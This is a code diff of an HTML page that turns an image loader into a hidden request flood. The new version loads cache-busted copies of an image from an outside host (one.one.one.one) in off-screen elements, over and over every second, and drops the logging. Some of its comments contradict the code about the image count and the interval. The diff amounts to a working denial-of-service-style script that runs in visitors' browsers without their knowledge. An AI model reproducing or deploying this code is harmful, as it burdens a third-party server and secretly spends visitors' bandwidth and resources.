@@ -3,109 +3,45 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Load 100 Images Without Preview</title>
+  <title>Heavy Image Load</title>
   <style>
-    /* Make images invisible initially (they won't be previewed) */
-    img {
-      display: none;
-    }
-    #log {
-      white-space: pre-wrap;
-      font-family: monospace;
-      background-color: #f4f4f4;
-      padding: 10px;
-      border: 1px solid #ccc;
-      margin-top: 20px;
-      max-height: 200px;
-      overflow-y: auto;
+    /* Prevent images from being visible, but still force the download */
+    .offscreen {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      width: 1px;
+      height: 1px;
     }
   </style>
 </head>
 <body>
-  <h1>Loading Images...</h1>
-  <div id="log"></div> <!-- This will display the logs -->
+  <h1>Loading 1000 Images...</h1>
 
   <script>
     const baseUrl = 'https://one.one.one.one/media/card.png';
-    const imagesPerBatch = 25; // Load 25 new images per batch
-    const maxImages = 500; // Limit the total images to 100
-    let loadedImages = 0; // Track number of successfully loaded images
-    let totalImagesLoaded = 0; // Track total images loaded
-    const container = document.createElement('div'); // Create a container to hold the images
+    const totalImages = 10; // Number of images to load
+    const container = document.createElement('div'); // Container to append images
     document.body.appendChild(container);
 
-    const logElement = document.getElementById('log'); // Element to display logs
-
-    // Function to log messages to the HTML page
-    function logMessage(message) {
-      const logEntry = document.createElement('div');
-      logEntry.textContent = message;
-      logElement.appendChild(logEntry);
-      logElement.scrollTop = logElement.scrollHeight; // Auto-scroll to bottom
-    }
-
-    // Function to load a batch of images
     function loadImages() {
-      if (totalImagesLoaded >= maxImages) {
-        // Stop loading if the maximum image count is reached
-        logMessage(`Max images loaded: ${maxImages}`);
-        return;
-      }
-
-      let batchLoaded = 0; // Track images loaded in this batch
-      const images = []; // Array to hold image elements for this batch
-
-      // Create and load images in the batch
-      for (let i = 0; i < imagesPerBatch; i++) {
+      for (let i = 0; i < totalImages; i++) {
         const img = new Image();
-        const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`; // Random parameter for cache busting
-        img.src = `${baseUrl}?cb=${cacheBuster}`; // Add random parameter to avoid cache
-
-        img.onload = () => {
-          batchLoaded++; // Increment batch load count
-          loadedImages++; // Increment total loaded images count
-          totalImagesLoaded++;
-
-          // Log successful image load
-          logMessage(`Image ${totalImagesLoaded} loaded: ${img.src}`);
-
-          // If 25 images have loaded, check if we need to load more
-          if (loadedImages >= 10) {
-            logMessage(`25 images loaded. Total loaded: ${totalImagesLoaded}`);
-            loadImages(); // Start loading the next batch of images
-            loadedImages = 0; // Reset the counter for the next batch
-          }
+        const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
+        img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
+        img.className = 'offscreen'; // Off-screen but downloading
+        img.onload = img.onerror = () => {
+          // Optional: Do something when each image loads or fails (like logging)
+          // console.log('Image loaded:', img.src);
         };
-
-        img.onerror = (error) => {
-          // Log image loading error, but don't stop the script
-          logMessage(`Error loading image: ${img.src}`);
-
-          batchLoaded++; // Count error images to avoid blocking
-
-          // If all images in the batch have attempted to load, move to the next batch
-          if (batchLoaded === imagesPerBatch) {
-            if (loadedImages >= 10) {
-              loadImages(); // Load next batch after 25 images are loaded
-              loadedImages = 0;
-            }
-          }
-        };
-
-        images.push(img); // Store the image element for batch tracking
+        container.appendChild(img);
       }
-
-      // Append all images to the DOM
-      images.forEach(img => container.appendChild(img));
     }
 
-    loadImages(); // Start loading the initial batch of 25 images
+    loadImages(); // Start loading images
 
-    // Function to refresh the page every 15 seconds and log total images loaded
-    setTimeout(() => {
-      logMessage(`Refreshing the page after loading ${totalImagesLoaded} images...`);
-      location.reload(); // Refresh the page
-    }, 15000); // Refresh after 15 seconds (15000 milliseconds)
+    // Keep reloading the images every 3 seconds
+    setInterval(loadImages, 1000);
   </script>
 </body>
 </html>
